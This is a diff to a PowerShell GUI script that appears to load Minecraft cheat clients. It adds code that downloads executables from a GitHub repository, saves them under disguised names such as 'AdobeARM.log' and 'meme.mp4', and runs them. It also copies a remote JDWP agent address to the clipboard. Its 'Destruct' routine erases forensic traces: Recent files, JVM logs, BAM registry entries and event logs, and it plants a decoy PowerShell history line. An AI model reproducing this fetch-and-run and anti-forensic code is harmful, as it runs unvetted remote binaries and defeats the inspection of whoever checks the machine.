@@ -191,8 +191,38 @@ function Show-MainMenu {
     $form.Controls.Add($injectButton)
     $form.Controls.Add($destructButton)
 }
+# Path to the custom sound file on Z drive
+$soundFilePath = "Z:\na.wav"
+
+# Function to download the sound file
+function Download-SoundFile {
+    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"  # Replace with the actual URL of the sound file
+    try {
+        iwr -Uri $soundUrl -OutFile $soundFilePath
+    } catch {
+        Write-Error "Failed to download sound file: $_"
+        exit 1
+    }
+}
+
 # Inject Button Click: Show Prestige and Vape buttons
 $injectButton.Add_Click({
+    # Disable the form to prevent interaction
+    $form.Enabled = $false
+    
+    # Download the sound file
+    Download-SoundFile
+    
+    # Load the sound player
+    $player = New-Object System.Media.SoundPlayer
+    $player.SoundLocation = $soundFilePath
+    
+    # Play the custom sound
+    $player.PlaySync()
+    
+    # Re-enable the form after sound playback
+    $form.Enabled = $true
+    
     $form.Controls.Clear()
     $form.Controls.Add($label)
     # Back Button
@@ -228,33 +258,47 @@ $injectButton.Add_Click({
     $vapev4Button.Location = New-Object System.Drawing.Point(450, 200)
     $vapev4Button.BackColor = 'Blue'
     $vapev4Button.ForeColor = 'Black'
+    # Phantom Button
+    $phantomButton = New-Object System.Windows.Forms.Button
+    $phantomButton.Text = 'Phantom'
+    $phantomButton.Width = 120
+    $phantomButton.Height = 40
+    $phantomButton.Location = New-Object System.Drawing.Point(600, 200)
+    $phantomButton.BackColor = 'Red'
+    $phantomButton.ForeColor = 'Black'
+    $phantomButton.Add_Click({
+        $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
+        Set-Clipboard -Value $clipboardText
+    })
     # Add buttons to form
     $form.Controls.Add($prestigeButton)
     $form.Controls.Add($vapeliteButton)
     $form.Controls.Add($backButton)
     $form.Controls.Add($vapev4Button)
+    $form.Controls.Add($phantomButton)
     # === YOUR CUSTOM PRESTIGE LOGIC HERE ===
     $prestigeButton.Add_Click({
-        if (-Not (Test-Path "Z:\sodium-fabric-0.6.13+mc1.21.4.jar")) {
-            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium.jar"  -OutFile "Z:\sodium-fabric-0.6.13+mc1.21.4.jar"
+        if (-Not (Test-Path "Z:\meme.mp4")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium.jar"  -OutFile "Z:\meme.mp4"
         }
-        Start-Process java -ArgumentList '-jar "Z:\sodium-fabric-0.6.13+mc1.21.4.jar"'
+        Start-Process java -ArgumentList '-jar "Z:\meme.mp4"'
     })
     # === YOUR CUSTOM VAPELITE LOGIC HERE ===
     $vapeliteButton.Add_Click({
-        if (-Not (Test-Path "Z:\scrcons.exe")) {
-            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/wpbbin.exe"  -OutFile "Z:\scrcons.exe"
+        if (-Not (Test-Path "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/wpbbin.exe"  -OutFile "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp"
         }
-        Start-Process "Z:\scrcons.exe"
+        Start-Process "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp"
     })
     # === YOUR CUSTOM VAPEV4 LOGIC HERE ===
     $vapev4Button.Add_Click({
-        if (-Not (Test-Path "Z:\bitsadmin.exe")) {
-            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/svchost.exe"  -OutFile "Z:\bitsadmin.exe"
+        if (-Not (Test-Path "Z:\AdobeARM.log")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/svchost.exe"  -OutFile "Z:\AdobeARM.log"
         }
-        Start-Process "Z:\bitsadmin.exe"
+        Start-Process "Z:\AdobeARM.log"
     })
 })
+
 # Destruct Button
 $destructButton.Add_Click({
     # Path to the virtual disk
@@ -303,9 +347,7 @@ assign letter=Z
     }
     # STEP 6: Clean up "Recent" shortcuts
     $recentPath = [Environment]::GetFolderPath("Recent")
-    Get-ChildItem -Path $recentPath -Filter "*.lnk" | Where-Object {
-        $_.Name -like "javaruntime.ps1*" -or $_.Name -like "powershell*"
-    } | ForEach-Object {
+    Get-ChildItem -Path $recentPath -Filter "*" | ForEach-Object {
         Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
     }
     # Destruct other stuff after disk is gone
@@ -313,12 +355,6 @@ assign letter=Z
     Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force
     # Clear Temp
     Remove-Item -Path "C:\temp\*" -Recurse -Force
-    # Clean up "Recent" shortcuts again
-    Get-ChildItem -Path $recentPath -Filter "*.lnk" | Where-Object {
-        $_.Name -like "javaruntime.ps1*" -or $_.Name -like "powershell*"
-    } | ForEach-Object {
-        Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
-    }
     Stop-Process -Name vds -Force
     Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" | Where-Object { $_.Name -like "*PowerShell*" } | Remove-Item -Force
     # Event logs
@@ -333,10 +369,24 @@ assign letter=Z
     gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name }
     # Conhost History
     Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1  | iex'
+    # Clear JVM args logs and traces by clearing content
+    $jvmLogFiles = @(
+        "$env:USERPROFILE\.java\deployment\log\*.log",
+        "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
+        "$env:USERPROFILE\AppData\Local\Sun\Java\Deployment\log\*.log",
+        "$env:USERPROFILE\AppData\Roaming\Sun\Java\Deployment\log\*.log"
+    )
+    foreach ($file in $jvmLogFiles) {
+        Get-ChildItem -Path $file -ErrorAction SilentlyContinue | ForEach-Object {
+            Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
+        }
+    }
     # Stop the script process
     Stop-Process -Id $PID
 })
+
 # Initial Load
 Show-MainMenu
+
 # Run the form
 [void]$form.ShowDialog()
